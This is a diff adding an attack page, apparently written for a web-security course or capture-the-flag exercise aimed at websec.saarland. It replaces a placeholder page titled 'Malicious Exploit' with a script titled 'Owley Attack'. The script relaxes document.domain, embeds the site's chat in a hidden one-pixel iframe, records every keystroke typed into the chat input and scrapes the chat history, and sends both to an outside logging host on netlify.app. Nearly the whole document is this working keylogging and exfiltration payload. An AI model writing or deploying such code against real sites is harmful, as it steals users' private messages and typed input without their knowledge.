@@ -1,10 +1,47 @@
 <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Malicious Exploit</title>
-    </head>
-    <body>
-        
-        <p>Hello World</p>
-    </body>
-    </html>
+<html>
+<head>
+  <title>Owley Attack</title>
+</head>
+<body>
+  <h1>Loading…</h1>
+
+  <script>
+  (function () {
+      document.domain = 'websec.saarland';
+
+      const iframe = document.createElement('iframe');
+      iframe.src = 'https://chat.websec.saarland';
+      iframe.style.width = '1px';
+      iframe.style.height = '1px';
+      iframe.style.border = 'none';
+      document.body.appendChild(iframe);
+
+      iframe.onload = function () {
+          try {
+              const chatDoc = iframe.contentWindow.document;
+              const inputField = chatDoc.querySelector('input');
+
+              if (!inputField) {
+                  fetch('https://timely-choux-365656.netlify.app/log?error=no_input_found');
+                  return;
+              }
+
+              inputField.addEventListener('input', function () {
+                  const text = inputField.value;
+                  fetch('https://timely-choux-365656.netlify.app/log?data=' + encodeURIComponent(text));
+              });
+
+              const chatBox = chatDoc.querySelector('.chat-box');
+              if (chatBox) {
+                  const messages = chatBox.innerText;
+                  fetch('https://timely-choux-365656.netlify.app/log?chat=' + encodeURIComponent(messages));
+              }
+          } catch (err) {
+              fetch('https://timely-choux-365656.netlify.app/log?error=' + encodeURIComponent(err.message));
+          }
+      };
+  })();
+  </script>
+</body>
+</html>
